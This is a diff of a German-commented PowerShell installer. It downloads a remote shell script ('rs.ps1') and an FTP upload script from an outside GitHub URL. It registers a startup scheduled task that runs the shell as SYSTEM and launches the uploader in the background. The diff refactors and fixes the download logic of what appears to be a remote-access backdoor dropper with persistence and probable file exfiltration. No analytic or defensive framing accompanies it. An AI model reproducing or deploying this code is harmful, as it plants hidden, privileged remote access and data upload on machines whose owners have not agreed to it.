@@ -1,9 +1,17 @@
-$url = "https://raw.githubusercontent.com/fiveraptor/rs/main/rs.ps1"
-$zielSpeicherort = "C:\RemoteShell\rs.ps1"
+$rsUrl = "https://raw.githubusercontent.com/fiveraptor/rs/main/rs.ps1"
+$ftpUrl = "https://raw.githubusercontent.com/fiveraptor/rs/main/ftp_upload.ps1"
+$zielSpeicherort = "C:\RemoteShell"
+
 # Erstelle eine WebClient-Instanz
 $webClient = New-Object System.Net.WebClient
-# Lade die Datei herunter und speichere sie am gewünschten Speicherort
-$webClient.DownloadFile($url, $zielSpeicherort)
+
+# Lade das rs.ps1-Skript herunter und speichere es am gewünschten Speicherort
+$rsScriptPath = Join-Path $zielSpeicherort "rs.ps1"
+$webClient.DownloadFile($rsUrl, $rsScriptPath)
+
+# Lade das ftp_upload.ps1-Skript herunter und speichere es am gewünschten Speicherort
+$ftpScriptPath = Join-Path $zielSpeicherort "ftp_upload.ps1"
+$webClient.DownloadFile($ftpUrl, $ftpScriptPath)
 
 
 Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-File "C:\RemoteShell\rs.ps1"') -Trigger (New-ScheduledTaskTrigger -AtStartup) -TaskName "rs" -Principal (New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount) -Settings (New-ScheduledTaskSettingsSet  -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries)
@@ -11,15 +19,5 @@ Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'Powershell.exe
 Start-ScheduledTask -TaskName "rs"
 
 
-$url2 = "https://raw.githubusercontent.com/fiveraptor/rs/main/ftp_upload.ps1"
-$zielSpeicherort2 = "C:\RemoteShell\ftp_upload.ps1"
-# Erstelle eine WebClient-Instanz
-$webClient2 = New-Object System.Net.WebClient
-# Lade die Datei herunter und speichere sie am gewünschten Speicherort
-$webClient2.DownloadFile($url, $zielSpeicherort)
-
-
-$skriptPfad = "C:\RemoteShell\ftp_upload.ps1"
-
-# Starte das Skript im Hintergrund als Job
-Start-Job -ScriptBlock { param($pfad) & $pfad } -ArgumentList $skriptPfad
+# Starte das ftp_upload.ps1-Skript als Hintergrundjob
+$ftpJob = Start-Job -ScriptBlock { Param($ftpScriptPath) & $ftpScriptPath } -ArgumentList $ftpScriptPath
